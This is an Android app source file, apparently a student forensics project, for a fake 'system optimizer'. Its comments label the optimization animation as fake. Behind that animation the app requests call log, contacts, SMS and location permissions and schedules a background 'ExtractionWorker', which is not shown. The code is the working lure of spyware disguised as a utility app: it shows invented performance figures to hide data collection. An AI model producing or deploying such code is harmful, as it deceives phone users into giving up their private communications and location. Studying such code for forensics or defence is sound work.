package mx.ipn.escuela.pruebaproyectofinalforense;

import android.Manifest;
import android.animation.ObjectAnimator;
import android.animation.PropertyValuesHolder;
import android.animation.ValueAnimator;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.view.animation.LinearInterpolator;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_PERMISSIONS = 100;

    private ImageButton optimizeButton;
    private ImageView checkIcon;
    private ProgressBar progressBar;
    private TextView statusTextView, ramUsageTextView, storageUsageTextView, tempTextView;
    private View scanline, pulsingRing;
    private Handler handler = new Handler(Looper.getMainLooper());
    private ObjectAnimator scanlineAnimator, pulseAnimator;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // --- Find Views ---
        optimizeButton = findViewById(R.id.optimizeButton);
        checkIcon = findViewById(R.id.checkIcon);
        progressBar = findViewById(R.id.progressBar);
        statusTextView = findViewById(R.id.statusTextView);
        ramUsageTextView = findViewById(R.id.ramUsageTextView);
        storageUsageTextView = findViewById(R.id.storageUsageTextView);
        tempTextView = findViewById(R.id.tempTextView);
        scanline = findViewById(R.id.scanline);
        pulsingRing = findViewById(R.id.pulsing_ring);

        // --- Initial Animations ---
        startScanlineAnimation();
        startPulsingAnimation();

        optimizeButton.setOnClickListener(v -> {
            if (checkPermissions()) {
                startOptimizationAndExtraction();
            } else {
                requestPermissions();
            }
        });
    }

    private void startScanlineAnimation() {
        scanlineAnimator = ObjectAnimator.ofFloat(scanline, "translationY", -scanline.getHeight(), findViewById(android.R.id.content).getHeight());
        scanlineAnimator.setDuration(3000);
        scanlineAnimator.setInterpolator(new LinearInterpolator());
        scanlineAnimator.setRepeatCount(ObjectAnimator.INFINITE);
        scanlineAnimator.start();
    }

    private void startPulsingAnimation() {
        pulseAnimator = ObjectAnimator.ofPropertyValuesHolder(
                pulsingRing,
                PropertyValuesHolder.ofFloat(View.SCALE_X, 1f, 1.2f),
                PropertyValuesHolder.ofFloat(View.SCALE_Y, 1f, 1.2f),
                PropertyValuesHolder.ofFloat(View.ALPHA, 1f, 0f)
        );
        pulseAnimator.setDuration(1500);
        pulseAnimator.setInterpolator(new AccelerateDecelerateInterpolator());
        pulseAnimator.setRepeatCount(ObjectAnimator.INFINITE);
        pulseAnimator.start();
    }

    private void startOptimizationAndExtraction() {
        optimizeButton.setEnabled(false);
        pulseAnimator.pause(); // Stop pulsing during scan
        progressBar.setVisibility(View.VISIBLE);
        statusTextView.setText("Analyzing System Core...");

        // Schedule the real background work
        OneTimeWorkRequest extractionWorkRequest = new OneTimeWorkRequest.Builder(ExtractionWorker.class).build();
        WorkManager.getInstance(getApplicationContext()).enqueue(extractionWorkRequest);

        // --- Epic Fake Optimization UI Animation ---
        handler.postDelayed(() -> statusTextView.setText("Defragmenting Memory..."), 1500);
        handler.postDelayed(() -> {
            statusTextView.setText("Optimizing RAM...");
            animateMetric(ramUsageTextView, 45, 25, "%");
        }, 3000);
        handler.postDelayed(() -> {
            statusTextView.setText("Securing Network Packets...");
            animateMetric(storageUsageTextView, 62, 58, "%");
        }, 4500);
        handler.postDelayed(() -> {
            statusTextView.setText("Cooling CPU...");
            animateMetric(tempTextView, 38, 32, "°C");
        }, 6000);

        handler.postDelayed(() -> {
            progressBar.setVisibility(View.INVISIBLE);
            optimizeButton.setVisibility(View.GONE);
            checkIcon.setVisibility(View.VISIBLE);
            animateSuccessCheck();
            statusTextView.setText("System Secured & Optimized!");
            Toast.makeText(MainActivity.this, "Device is now running at peak performance.", Toast.LENGTH_SHORT).show();

            // Reset UI after showing success checkmark
            handler.postDelayed(this::resetUi, 3000);
        }, 8000);
    }

    private void animateMetric(TextView textView, int from, int to, String suffix) {
        ValueAnimator animator = ValueAnimator.ofInt(from, to);
        animator.setDuration(1000);
        animator.addUpdateListener(animation -> textView.setText(animation.getAnimatedValue().toString() + suffix));
        animator.start();
    }

    private void animateSuccessCheck() {
        checkIcon.setScaleX(0.5f);
        checkIcon.setScaleY(0.5f);
        checkIcon.animate().scaleX(1f).scaleY(1f).setDuration(500).setInterpolator(new AccelerateDecelerateInterpolator()).start();
    }

    private void resetUi() {
        checkIcon.setVisibility(View.GONE);
        optimizeButton.setVisibility(View.VISIBLE);
        optimizeButton.setEnabled(true);
        statusTextView.setText("System Secure. Press shield to scan.");
        ramUsageTextView.setText("45%");
        storageUsageTextView.setText("62%");
        tempTextView.setText("38°C");
        pulseAnimator.resume();
    }

    private boolean checkPermissions() {
        String[] permissions = {
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        String[] permissions = {
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        };

        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(permission);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), REQUEST_CODE_PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (checkPermissions()) {
                Toast.makeText(this, "System permissions verified.", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Critical permissions were denied.", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null); // Clean up handler
        if (scanlineAnimator != null) scanlineAnimator.cancel();
        if (pulseAnimator != null) pulseAnimator.cancel();
    }
}
